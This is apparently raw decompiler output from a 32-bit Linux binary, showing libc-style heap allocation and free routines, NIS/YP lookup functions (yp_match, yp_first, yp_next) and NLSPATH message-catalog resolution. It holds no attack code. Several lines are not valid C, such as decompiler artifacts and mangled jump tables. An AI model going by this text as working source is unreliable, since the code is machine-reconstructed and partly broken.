            if(!( *L08078B34 & edi)) {
                Vfffffffc = Vfffffffc & -4;
                Vfffffffc = Vfffffffc + 4;
                edi = edi + edi;
                Vfffffff0 = edi;
                if(!( *L08078B34 & Vfffffff0)) {
                    do {
                        Vfffffffc = Vfffffffc + 4;
                        Vfffffff0 = Vfffffff0 << 1;
                    } while(*L08078B34 & Vfffffff0);
                }
            }
            while(1) {
                eax = Vfffffffc * 8;
                do {
                    edi = eax + 0x8078b34;
                    Vfffffff8 = edi;
                    ebx = *(eax + 0x8078b3c);
                    if(ebx != Vfffffff8) {
                        do {
                            cl = *ebx & 252;
                            Vffffffec = ecx;
                            edx = Vffffffec - Vfffffff4;
                            if(edx > 15) {
                                goto L0805c208;
                            }
                            if(edx >= 0) {
                                goto L0805c24c;
                            }
                            ebx = *(ebx + 8);
                        } while(Vfffffff8 != ebx);
                    }
                    eax = eax + 8;
                    Vfffffffc = Vfffffffc + 1;
                } while(Vfffffffc & 3);
                do {
                    if(!(esi & 3)) {
                        goto L0805c158;
                    }
L0805c13c:
                    esi = esi - 1;
                    eax = esi * 8 + 0x8078b34;
                } while(*(esi * 8 + 0x8078b38) == eax);
                goto L0805c160;
L0805c158:
                eax = !Vfffffff0;
                *L08078B34 = *L08078B34 & eax;
L0805c160:
                Vfffffff0 = Vfffffff0 << 1;
                ecx = Vfffffff0;
                if(*L08078B34 < ecx || ecx == 0) {
                    goto L0805c198;
                }
                if(*L08078B34 & ecx) {
                    continue;
                }
                do {
                    Vfffffffc = Vfffffffc + 4;
                    Vfffffff0 = Vfffffff0 << 1;
                } while(*L08078B34 & Vfffffff0);
            }
            goto L0805c13c;
        }
L0805c198:
        edx = ( *( *L08078B38) & 252) - Vfffffff4;
        if(edx <= 15) {
            ecx = Vfffffff4;
            if(*L08078F48 > ecx) {
                goto L0805c1cc;
            }
            ebx = L0805BA88(ecx);
            if(ebx == 0) {
L0805c1cc:
                edi = Vfffffff4;
                L0805BBF4(edi);
                edx = ( *( *L08078B38) & 252) - edi;
                if(edx > 15) {
                    goto L0805c264;
                }
                eax = 0;
                goto L0805c284;
L0805c1f0:
                esi = *(ebx + 8);
                ecx = *(ebx + 4);
                Vfffffff0 = ecx;
                *(ecx + 8) = esi;
                *(esi + 4) = ecx;
                *(Vffffffec + ebx) = *(Vffffffec + ebx) | 1;
                goto L0805c281;
L0805c208:
                eax = Vfffffff4 + ebx;
                *ebx = Vfffffff4 | 1;
                esi = *(ebx + 8);
                edi = *(ebx + 4);
                Vfffffff0 = edi;
                *(edi + 8) = esi;
                *(esi + 4) = edi;
                *L08078B44 = eax;
                *L08078B40 = eax;
                *(eax + 8) = 0x8078b3c;
                *(eax + 4) = 0x8078b3c;
                *eax = edx | 1;
                *(edx + eax - 4) = edx;
                goto L0805c281;
L0805c24c:
                *(Vffffffec + ebx) = *(Vffffffec + ebx) | 1;
                esi = *(ebx + 8);
                ecx = *(ebx + 4);
                Vfffffff0 = ecx;
                *(ecx + 8) = esi;
                *(esi + 4) = ecx;
            }
        } else {
L0805c264:
            ebx = *L08078B38;
            *ebx = Vfffffff4 | 1;
            eax = Vfffffff4 + ebx;
            *L08078B38 = eax;
            *( *L08078B38) = dl | 1;
        }
    }
L0805c281:
    eax = ebx + 4;
L0805c284:
    esp = ebp - 32;
}



L0805C290(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    eax = A8;
    if(eax != 0) {
        edi = eax - 4;
        eax = *(eax - 4);
        if(!(al & 2)) {
            (save)edi;
            eax = L0805BB34();
        } else {
            esi = eax & -2;
            ecx = esi + edi;
            Vfffffff4 = ecx;
            bl = *ecx & 252;
            Vfffffffc = ebx;
            if(*L08078B38 != ecx) {
                goto L0805c31c;
            }
            esi = esi + ebx;
            if(!(al & 1)) {
                eax = *(edi - 4);
                edi = edi - eax;
                esi = esi + eax;
                ecx = *(edi + 8);
                Vfffffff0 = ecx;
                edx = *(edi + 4);
                *(edx + 8) = ecx;
                *( *(edx + 8) + 4) = edx;
            }
            *edi = esi | 1;
            *L08078B38 = edi;
            if(*L08078F3C <= esi) {
                eax = L0805C944( *L08078F40);
                goto L0805c4ed;
L0805c31c:
                *Vfffffff4 = Vfffffffc;
                Vfffffff8 = 0;
                if(!(al & 1)) {
                    eax = *(edi - 4);
                    edi = edi - eax;
                    esi = esi + eax;
                    if(*(edi + 4) == 0x8078b3c) {
                        Vfffffff8 = 1;
                    } else {
                        ecx = *(edi + 8);
                        Vfffffff0 = ecx;
                        edx = *(edi + 4);
                        *(edx + 8) = ecx;
                        *( *(edx + 8) + 4) = edx;
                    }
                }
                ebx = Vfffffff4;
                ecx = Vfffffffc;
                if(!( *(ecx + ebx) & 1)) {
                    esi = esi + ecx;
                    if(Vfffffff8 == 0 && *(ebx + 4) == 0x8078b3c) {
                        Vfffffff8 = 1;
                        *L08078B44 = edi;
                        *L08078B40 = edi;
                        *(edi + 8) = 0x8078b3c;
                        *(edi + 4) = 0x8078b3c;
                    } else {
                        ebx = *(Vfffffff4 + 8);
                        Vfffffff0 = ebx;
                        edx = *(Vfffffff4 + 4);
                        *(edx + 8) = ebx;
                        *( *(edx + 8) + 4) = edx;
                    }
                }
                *edi = esi | 1;
                *(esi + edi - 4) = esi;
                if(Vfffffff8 == 0) {
                    if(esi <= 511) {
                        Vfffffff4 = esi >> 3;
                        eax = Vfffffff4;
                        if(eax < 0) {
                            eax = eax + 3;
                        }
                        eax = eax >> 2;
                        eax = 1 << eax;
                        *L08078B34 = *L08078B34 | eax;
                        Vfffffff0 = ecx;
                        edx = *(ecx + 4);
                    } else {
                        eax = esi >> 9;
                        if(!(ecx = Vfffffff4 * 8 + 0x8078b34)) {
                            Vfffffff4 = esi >> 3;
                        } else {
                            if(esi >> 9 <= 4) {
                                Vfffffff4 = (esi >> 6) + 56;
                            } else {
                                eax = esi >> 9;
                                Vfffffff4 = eax <= 20 ? eax + 91 : esi >> 9 <= 84 ? (esi >> 12) + 110 : esi >> 9 <= 340 ? (esi >> 15) + 119 : esi >> 9 <= 1364 ? (esi >> 18) + 124 : 126;
                            }
                        }
                        ecx = Vfffffff4 * 8 + 0x8078b34;
                        Vfffffff0 = ecx;
                        edx = *(ecx + 4);
                        if(edx == ecx) {
                            eax = 1 << Vfffffff4 >> 2;
                            *L08078B34 = *L08078B34 | eax;
                        } else {
                            do {
                                al = *edx & 252;
                                if(esi >= eax) {
                                    break;
                                }
                                edx = *(edx + 4);
                            } while(Vfffffff0 != edx);
                            Vfffffff0 = *(edx + 8);
                        }
                        ecx = Vfffffff0;
                    }
                    *(edi + 8) = ecx;
                    *(edi + 4) = edx;
                    *(ecx + 4) = edi;
                    *(edx + 8) = edi;
                }
            }
        }
    }
L0805c4ed:
    esp = ebp - 28;
}







L0805C904(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;



    eax = A8;
    Ac = Ac * eax;
    ebx = L0805BD74(eax);
    if(ebx == 0) {
        eax = 0;
    } else {
        if(!( *(ebx - 4) & 2)) {
            L08057764(ebx, 0, ( *(ebx - 4) & 252) + -4);
        }
        eax = ebx;
    }
}


L0805C944(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;



    esi = *( *L08078B38) & -4;
    ebx = (esi - A8 + 4079 >> 12) - 1 << 12;
    if(ebx >= 4096 && *( *L08078B30)(0) == esi + *L08078B38) {
        if(*( *L08078B30)( ~ebx) != 0) {
            goto L0805c9d0;
        }
        edx = *( *L08078B30)(0);
        esi = edx - *L08078B38;
        if(esi > 15) {
            *L08078F58 = edx - *L08078F4C;
            *( *L08078B38) = esi | 1;
        }
    }
    eax = 0;
    goto L0805c9e9;
L0805c9d0:
    *( *L08078B38) = esi - ebx | 1;
    *L08078F58 = *L08078F58 - ebx;
    eax = 1;
L0805c9e9:
}









L0805CCB0(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffffc;



    time( & Vfffffffc);
    ebx = *L0807E398;
    if(ebx != 0) {
        do {
            if(Vfffffffc > *(ebx + 24)) {
                break;
            }
            ebx = *ebx;
        } while(ebx != 0);
        if(ebx != 0) {
            goto L0805cd14;
        }
    }
    ebx = L0805BD74(28);
    (save)28;
    (save)ebx;
    L0806626C();
    esp = esp + 12;
    if(*L0807E398 != 0) {
        *ebx = *L0807E398;
    }
    *L0807E398 = ebx;
L0805cd14:
    if(*(ebx + 8) != 0) {
        L0805C290( *(ebx + 8));
    }
    if(*(ebx + 12) != 0) {
        L0805C290( *(ebx + 12));
    }
    *(ebx + 8) = 0;
    *(ebx + 12) = 0;
    eax = L0805BD74(A10);
    *(ebx + 8) = eax;
    if(eax != 0) {
        *(ebx + 12) = L0805BD74(A18);
        if(*(ebx + 8) == 0) {
            eax = L0805C290(0);
            *(ebx + 8) = 0;
        } else {
            *(ebx + 16) = A10;
            *(ebx + 20) = A18;
            L08056480(Ac, *(ebx + 8), *(ebx + 16));
            L08056480(A14, *(ebx + 12), *(ebx + 20));
            if(*(ebx + 4) != 0) {
                eax = L08057ADC( *(ebx + 4), A8);
                if(eax == 0) {
                    goto L0805cdd7;
                }
                L0805C290( *(ebx + 4));
            }
            eax = L08056664(A8);
            *(ebx + 4) = eax;
L0805cdd7:
            *(ebx + 24) = Vfffffffc + *L08069038;
        }
    }
    esp = ebp - 16;
}



L0805CDF0(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffffc;



    if(*L0807E398 == 0) {
        goto L0805ce75;
L0805ce0c:
        eax = *(ebx + 12);
        *A14 = eax;
        eax = *(ebx + 20);
        *A18 = eax;
        eax = 1;
    } else {
        time( & Vfffffffc);
        ebx = *L0807E398;
        do {
            if(*(ebx + 16) == A10 && L08057ADC( *(ebx + 4), A8) == 0 && L08056450( *(ebx + 8), Ac, A10) == 0 && *(ebx + 24) >= Vfffffffc) {
                goto L0805ce0c;
            }
            ebx = *ebx;
        } while(ebx != 0);
L0805ce75:
        eax = 0;
    }
    esp = ebp - 16;
}



L0805CE84(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffbb0;
	/* unknown */ void  Vfffffbb4;
	/* unknown */ void  Vfffffbb8;
	/* unknown */ void  Vfffffbbc;
	/* unknown */ void  Vfffffbc0;
	/* unknown */ void  Vfffffbc6;
	/* unknown */ void  Vfffffbc8;
	/* unknown */ void  Vfffffbcc;
	/* unknown */ void  Vfffffbd0;
	/* unknown */ void  Vfffffbd4;
	/* unknown */ void  Vfffffbd8;
	/* unknown */ void  Vfffffbdc;
	/* unknown */ void  Vfffffbe0;
	/* unknown */ void  Vfffffbe4;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffbb4 = 0;
    eax = getpid();
    Vfffffbb0 = eax;
    if(*L08078F94 != -1 && *L08078F94 != eax) {
        esi = *L0807EB94;
        do {
            if(*(esi + 288) != 0) {
                edx = *(esi + 288);
                *( *( *(edx + 4) + 16))(edx);
            }
            ebx = *esi;
            L0805C290(esi);
            esi = ebx;
        } while(esi != 0);
        *L0807EB94 = 0;
    }
    *L08078F94 = Vfffffbb0;
    if(Ac != 0) {
        *Ac = 0;
    }
    if(A8 != 0) {
        al = 0;
        edi = A8;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        if(ecx != -2) {
            goto L0805cf34;
        }
    }
    eax = 1;
    goto L0805d2e6;
L0805cf34:
    esi = *L0807EB94;
    if(esi != 0) {
        do {
            if(L08057ADC(A8, esi + 4) == 0) {
                break;
            }
            esi = *esi;
        } while(esi != 0);
        if(esi != 0) {
            goto L0805cf96;
        }
    }
    esi = L0805BD74(300);
    (save)300;
    (save)esi;
    L0806626C();
    *(esi + 284) = -1;
    *(esi + 296) = 0;
    Vfffffbb4 = 1;
    esp = esp + 12;
L0805cf96:
    while(1) {
        if(*(esi + 296) == 0) {
            (save)2;
            ebx = & Vfffffbe4;
            L0804F808(ebx, "%s/%s.%d", "/var/yp/binding");
            ebx = open(ebx, O_RDONLY, A8);
            if(ebx >= 0) {
                goto L0805cfda;
            }
        }
        if(*(esi + 296) + 1 <= 1) {
            ebx = & Vffffffe4;
            L0806626C(ebx, 16);
            Vffffffe4 = 2;
            Vffffffe8 = 16777343;
            Vfffffbc0 = -1;
            ebx = L08063B04(ebx, 100007, 2, & Vfffffbc0, 0, 0);
            if(ebx == 0) {
                goto L0805d12b;
            }
            Vfffffbb8 = *L08069030;
            Vfffffbbc = 0;
            edx = *(ebx + 4);
            if(*( *edx)(ebx, 1, 0x8066464, A8, 0x8066800, & Vfffffff4, Vfffffbb8, Vfffffbbc) != 0) {
                goto L0805d126;
            }
            *( *( *(ebx + 4) + 16))(ebx);
            if(Vfffffff4 != 1) {
                goto L0805d156;
            }
            L0806626C(esi + 264, 16);
            *(esi + 264) = 2;
            *(esi + 266) = Vfffffffc;
            *(esi + 268) = Vfffffff8;
            *(esi + 280) = Vfffffffc;
            goto L0805d1fd;
L0805cfda:
            Vfffffbd4 = & Vfffffbc6;
            Vfffffbd8 = 2;
            Vfffffbdc = & Vfffffbc8;
            Vfffffbe0 = 12;
            eax = L08065E1C(ebx, & Vfffffbd4, 2);
            if(eax != Vfffffbd8 + Vfffffbe0) {
                goto L0805d023;
            }
L0805d03c:
            (save)16;
            (save)esi + 264;
            L0806626C();
            *(esi + 264) = 2;
            *(esi + 268) = Vfffffbcc;
            dx = Vfffffbd0;
            *(esi + 266) = dx;
            *(esi + 280) = *(esi + 266);
            close(ebx);
L0805d1fd:
            *(esi + 296) = 2;
            (save)A8;
            L08056640(esi + 4);
        }
        Vfffffbb8 = ( *L08069030 >> 31) + *L08069030 >> 1;
        Vfffffbbc = 0;
        if(*(esi + 288) != 0) {
            edx = *(esi + 288);
            *( *( *(edx + 4) + 16))(edx);
        }
        *(esi + 284) = -1;
        eax = L08064400(esi + 264, 100004, 2, Vfffffbb8, Vfffffbbc, esi + 284);
        *(esi + 288) = eax;
        if(*(esi + 288) != 0) {
            goto L0805d2a0;
        }
        *(esi + 296) = -1;
        continue;
L0805d023:
        close(ebx);
        *(esi + 296) = -1;
    }
    goto L0805d03c;
L0805d126:
    *( *( *(ebx + 4) + 16))(ebx);
L0805d12b:
    if(Vfffffbb4 != 0) {
        L0805C290(esi);
    }
    eax = 10;
    goto L0805d2e6;
L0805d156:
    edx = Vfffffff8;
    if(edx != 2) {
        > ? L0805d168 : ;
        if(edx != 1) {
            goto L0805d198;
            if(edx == 3) {
                goto L0805d190;
            }
            goto L0805d198;
        }
        (save)"YPBINDPROC_DOMAIN: Internal error\n";
    } else {
        L0804F680(0x80787a4, "YPBINDPROC_DOMAIN: No bound server for domain %s\n", A8);
        goto L0805d1aa;
L0805d190:
        (save)"YPBINDPROC_DOMAIN: Resource allocation failure\n";
        goto L0805d19d;
L0805d198:
        (save)"YPBINDPROC_DOMAIN: Unknown error\n";
    }
L0805d19d:
    (save)0x80787a4;
    L0804F680();
    esp = esp + 8;
L0805d1aa:
    if(Vfffffbb4 != 0) {
        L0805C290(esi);
    }
    eax = 3;
    goto L0805d2e6;
L0805d2a0:
    if(fcntl( *(esi + 284), F_SETFD, 1) == -1) {
        L080625DC("fcntl: F_SETFD");
    }
    if(Vfffffbb4 != 0) {
        *esi = *L0807EB94;
        *L0807EB94 = esi;
    }
    if(Ac != 0) {
        *Ac = esi;
    }
    eax = 0;
L0805d2e6:
    esp = ebp + -1116;
}



L0805D2F4(A8)
/* unknown */ void  A8;
{



    eax = *(A8 + 288);
    *(A8 + 288) = 0;
    *(A8 + 284) = -1;
    return(*( *( *(eax + 4) + 16))(eax));
}






L0805D3A8(A8, Ac, A10, A14, A18, A1c)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vffffffdc = 0;
    if(A8 == 0 || *A8 == 0 || Ac == 0 || *Ac == 0 || A10 == 0 || A14 == 0 || *A10 == 0) {
        eax = 1;
    } else {
        *A18 = 0;
        *A1c = 0;
        do {
            eax = L0805CE84(A8, & Vffffffe0);
            if(eax != 0) {
                goto L0805d5ee;
            }
            if(L08057ADC(0x807e358, A8) == 0 && L0805CDF0(Ac, A10, A14, & Vfffffff8, & Vfffffffc) != 0) {
                goto L0805d458;
            }
            Vffffffd4 = *L08069030;
            Vffffffd8 = 0;
            Vffffffe4 = A8;
            Vffffffe8 = Ac;
            Vffffffec = A10;
            Vfffffff0 = A14;
            (save)12;
            ebx = & Vfffffff4;
            (save)ebx;
            L0806626C();
            ecx = *(Vffffffe0 + 288);
            eax = *(ecx + 4);
            (save)Vffffffd8;
            (save)Vffffffd4;
            (save)ebx;
            (save)0x80665a0;
            (save) & Vffffffe4;
            (save)0x8066514;
            (save)3;
            (save)ecx;
            ebx = *( *eax)();
            esp = esp + 40;
            if(ebx == 0) {
                goto L0805d54c;
            }
            (save)"yp_match: clnt_call";
            (save) *(Vffffffe0 + 288);
            L08063894();
            edx = Vffffffe0;
            *(edx + 296) = -1;
            (save)edx;
            L0805D2F4();
            esp = esp + 12;
            edx = Vffffffdc;
            Vffffffdc = Vffffffdc + 1;
        } while(*L08069034 > edx);
        goto L0805d540;
L0805d458:
        esi = A1c;
        *esi = Vfffffffc;
        eax = L0805BD74( *esi + 2);
        *A18 = eax;
        L08056480(Vfffffff8, eax, *A1c);
        esi = A1c;
        *( *esi + *A18) = 10;
        ecx = *esi;
        *( *A18 + ecx + 1) = 0;
        eax = 0;
        goto L0805d5ee;
L0805d540:
        eax = 2;
        goto L0805d5ee;
L0805d54c:
        ebx = L0805DFE0(Vfffffff4);
        if(ebx == 0) {
            esi = A1c;
            *esi = Vfffffffc;
            eax = L0805BD74( *esi + 2);
            *A18 = eax;
            L08056480(Vfffffff8, eax, *A1c);
            esi = A1c;
            *( *esi + *A18) = 10;
            ecx = *esi;
            *( *A18 + ecx + 1) = 0;
            if(L08057ADC(0x807e358, A8) == 0) {
                L0805CCB0(Ac, A10, A14, *A18, *A1c);
            }
        }
        (save) & Vfffffff4;
        (save)0x80665a0;
        L08064E74();
        L0805D2F4(Vffffffe0);
        eax = ebx;
    }
L0805d5ee:
    esp = ebp - 56;
}


L0805D5F8(A8)
/* unknown */ void  A8;
{



    *A8 = 0;
    if(*L0807E358 == 0 && L08065C84(0x807e358, 64) != 0) {
        eax = 12;
    } else {
        *A8 = 0x807e358;
        eax = 0;
    }
}



L0805D638(A8, Ac, A10, A14, A18, A1c)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vffffffdc = 0;
    *A18 = 0;
    *A10 = 0;
    *A1c = 0;
    *A14 = 0;
    if(A8 == 0 || *A8 == 0 || Ac == 0 || *Ac == 0) {
        eax = 1;
    } else {
        do {
            if(L0805CE84(A8, & Vffffffe8) != 0) {
                goto L0805d6a8;
            }
            Vffffffd4 = *L08069030;
            Vffffffd8 = 0;
            Vffffffe0 = A8;
            Vffffffe4 = Ac;
            (save)20;
            ebx = & Vffffffec;
            (save)ebx;
            L0806626C();
            ecx = *(Vffffffe8 + 288);
            eax = *(ecx + 4);
            (save)Vffffffd8;
            (save)Vffffffd4;
            (save)ebx;
            (save)0x80665dc;
            (save) & Vffffffe0;
            (save)0x8066564;
            (save)4;
            (save)ecx;
            ebx = *( *eax)();
            esp = esp + 40;
            if(ebx == 0) {
                goto L0805d754;
            }
            (save)"yp_first: clnt_call";
            (save) *(Vffffffe8 + 288);
            L08063894();
            edx = Vffffffe8;
            *(edx + 296) = -1;
            (save)edx;
            L0805D2F4();
            esp = esp + 12;
            edx = Vffffffdc;
            Vffffffdc = Vffffffdc + 1;
        } while(*L08069034 > edx);
        goto L0805d748;
L0805d6a8:
        eax = 3;
        goto L0805d80a;
L0805d748:
        eax = 2;
        goto L0805d80a;
L0805d754:
        ebx = L0805DFE0(Vffffffec);
        if(ebx == 0) {
            esi = A14;
            *esi = Vfffffff4;
            eax = L0805BD74( *esi + 2);
            *A10 = eax;
            L08056480(Vfffffff0, eax, *A14);
            esi = A14;
            *( *esi + *A10) = 10;
            ecx = *esi;
            *( *A10 + ecx + 1) = 0;
            esi = A1c;
            *esi = Vfffffffc;
            eax = L0805BD74( *esi + 2);
            *A18 = eax;
            L08056480(Vfffffff8, eax, *A1c);
            esi = A1c;
            *( *esi + *A18) = 10;
            ecx = *esi;
            *( *A18 + ecx + 1) = 0;
        }
        (save) & Vffffffec;
        (save)0x80665dc;
        L08064E74();
        L0805D2F4(Vffffffe8);
        eax = ebx;
    }
L0805d80a:
    esp = ebp - 56;
}


L0805D814(A8, Ac, A10, A14, A18, A1c, A20, A24)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
/* unknown */ void  A20;
/* unknown */ void  A24;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vffffffd4 = 0;
    if(A8 == 0 || *A8 == 0 || Ac == 0 || *Ac == 0 || A10 == 0 || A14 == 0 || *A10 == 0) {
        eax = 1;
    } else {
        *A20 = 0;
        *A18 = 0;
        *A24 = 0;
        *A1c = 0;
        do {
            if(L0805CE84(A8, & Vffffffd8) != 0) {
                goto L0805d898;
            }
            Vffffffcc = *L08069030;
            Vffffffd0 = 0;
            Vffffffdc = A8;
            Vffffffe0 = Ac;
            Vffffffe4 = A10;
            Vffffffe8 = A14;
            (save)20;
            ebx = & Vffffffec;
            (save)ebx;
            L0806626C();
            ecx = *(Vffffffd8 + 288);
            eax = *(ecx + 4);
            (save)Vffffffd0;
            (save)Vffffffcc;
            (save)ebx;
            (save)0x80665dc;
            (save) & Vffffffdc;
            (save)0x8066514;
            (save)5;
            (save)ecx;
            ebx = *( *eax)();
            esp = esp + 40;
            if(ebx == 0) {
                goto L0805d950;
            }
            (save)"yp_next: clnt_call";
            (save) *(Vffffffd8 + 288);
            L08063894();
            edx = Vffffffd8;
            *(edx + 296) = -1;
            (save)edx;
            L0805D2F4();
            esp = esp + 12;
            edx = Vffffffd4;
            Vffffffd4 = Vffffffd4 + 1;
        } while(*L08069034 > edx);
        goto L0805d944;
L0805d898:
        eax = 3;
        goto L0805da06;
L0805d944:
        eax = 2;
        goto L0805da06;
L0805d950:
        ebx = L0805DFE0(Vffffffec);
        if(ebx == 0) {
            esi = A1c;
            *esi = Vfffffff4;
            eax = L0805BD74( *esi + 2);
            *A18 = eax;
            L08056480(Vfffffff0, eax, *A1c);
            esi = A1c;
            *( *esi + *A18) = 10;
            ecx = *esi;
            *( *A18 + ecx + 1) = 0;
            esi = A24;
            *esi = Vfffffffc;
            eax = L0805BD74( *esi + 2);
            *A20 = eax;
            L08056480(Vfffffff8, eax, *A24);
            esi = A24;
            *( *esi + *A20) = 10;
            ecx = *esi;
            *( *A20 + ecx + 1) = 0;
        }
        (save) & Vffffffec;
        (save)0x80665dc;
        L08064E74();
        L0805D2F4(Vffffffd8);
        eax = ebx;
    }
L0805da06:
    esp = ebp - 64;
}








L0805DFE0(A8)
/* unknown */ void  A8;
{



    eax = A8 + 8;
    if(eax <= 10) {
        goto *(eax * 4 + 0x805dffc)[L0805e090, L0805e084, L0805e06c, L0805e078, L0805e06c, L0805e060, L0805e054, L0805e048, L0805e030, L0805e028, L0805e03c, ]goto ( *(eax * 4 + 0x805dffc));
        return(0);
        esp = ebp;
        return(10);
        esp = ebp;
        return(8);
        esp = ebp;
        return(4);
        esp = ebp;
        return(12);
        esp = ebp;
        return(5);
        esp = ebp;
        return(6);
        esp = ebp;
        return(13);
        esp = ebp;
        return(1);
        esp = ebp;
        return(14);
    }
    esp = ebp;
    return(6);
}




L0805E110(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffba8;
	/* unknown */ void  Vfffffbac;
	/* unknown */ void  Vfffffbb0;
	/* unknown */ void  Vfffffbb4;
	/* unknown */ void  Vfffffbb8;
	/* unknown */ void  Vfffffbbc;
	/* unknown */ void  Vfffffbc0;
	/* unknown */ void  Vfffffc00;



    Vfffffbbc = 0;
    Vfffffbb8 = 0;
    if(A8 != 0 && *A8 != 0) {
        ecx = A8;
        if(*ecx != 47) {
            goto L0805e178;
        }
        Vfffffbbc = ecx;
        if(stat(1, Vfffffbbc, & Vfffffbc0) == 0) {
            goto L0805e3d6;
        }
    }
L0805e16e:
    eax = -1;
    goto L0805e3ef;
L0805e178:
    eax = L08062D4C(5, 0);
    Vfffffbb4 = eax;
    if(Vfffffbb4 == 0) {
        Vfffffbb4 = "C";
    }
    esi = L08055668("NLSPATH");
    if(esi == 0) {
        esi = "/etc/locale/%L/%N.cat:/usr/lib/locale/%L/%N.cat:/usr/lib/locale/%N/%L:/usr/share/locale/%L/%N.cat:/usr/local/share/locale/%L/%N.cat";
    }
    if(*L08078F98 != 0) {
        al = 0;
        edi = esi;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        edx = ecx;
        edi = *L08078F98;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        eax = L0805BD74( !ecx - edx);
        Vfffffbb8 = eax;
        if(Vfffffbb8 == 0) {
            goto L0805e16e;
        }
        (save)esi;
        L08056640(Vfffffbb8);
        edi = Vfffffbb8;
        al = 0;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        edx = !ecx;
        Vfffffba8 = edx;
        if(*(Vfffffbb8 + Vfffffba8 - 2) != 58 && *( *L08078F98) != 58) {
            (save)":";
            L080577C0(Vfffffbb8);
        }
        (save) *L08078F98;
        L080577C0(Vfffffbb8);
        esi = Vfffffbb8;
    }
    edi = esi;
    al = 0;
    asm("cld");
    ecx = -1;
    asm("repne scasb");
    edx = !ecx;
    Vfffffba8 = edx;
    ebx = edx - 1;
    eax = L0805BD74(edx + 1);
    Vfffffbb0 = eax;
    Vfffffbac = eax;
    if(Vfffffbac == 0) {
        goto L0805e16e;
L0805e2a4:
        Vfffffbbc = ebx;
    } else {
        (save)esi;
        L08056640(Vfffffbac);
        eax = Vfffffbac;
        *(ebx + eax) = 58;
        *(eax + ebx + 1) = 0;
        esi = Vfffffbac;
        if(*eax != 0) {
            do {
                ecx = Vfffffbac;
                if(*ecx == 58) {
                    *ecx = 0;
                    ebx = & Vfffffc00;
                    do {
                        if(*esi == 37) {
                            if(*(esi + 1) == 76) {
                                goto L0805e30b;
                            }
                            if(*(esi + 1) == 78) {
                                goto L0805e32a;
                            }
                        }
                        *ebx = *esi;
                        ebx = ebx + 1;
                        goto L0805e35d;
L0805e32a:
                        esi = esi + 1;
                        (save)A8;
                        L08056640(ebx);
                        edi = A8;
                        goto L0805e338;
L0805e30b:
                        esi = esi + 1;
                        (save)Vfffffbb4;
                        L08056640(ebx);
                        edi = Vfffffbb4;
L0805e338:
                        al = 0;
                        asm("cld");
                        ecx = -1;
                        asm("repne scasb");
                        edx = !ecx;
                        Vfffffba8 = edx;
                        ebx = ebx + Vfffffba8 - 1;
L0805e35d:
                        esi = esi + 1;
                    } while(*esi != 0);
                    *ebx = 0;
                    ebx = & Vfffffc00;
                    if(stat(1, ebx, & Vfffffbc0) == 0) {
                        goto L0805e2a4;
                    }
                    esi = Vfffffbac + 1;
                }
                Vfffffbac = Vfffffbac + 1;
            } while(*Vfffffbac != 0);
        }
    }
    L0805C290(Vfffffbb0);
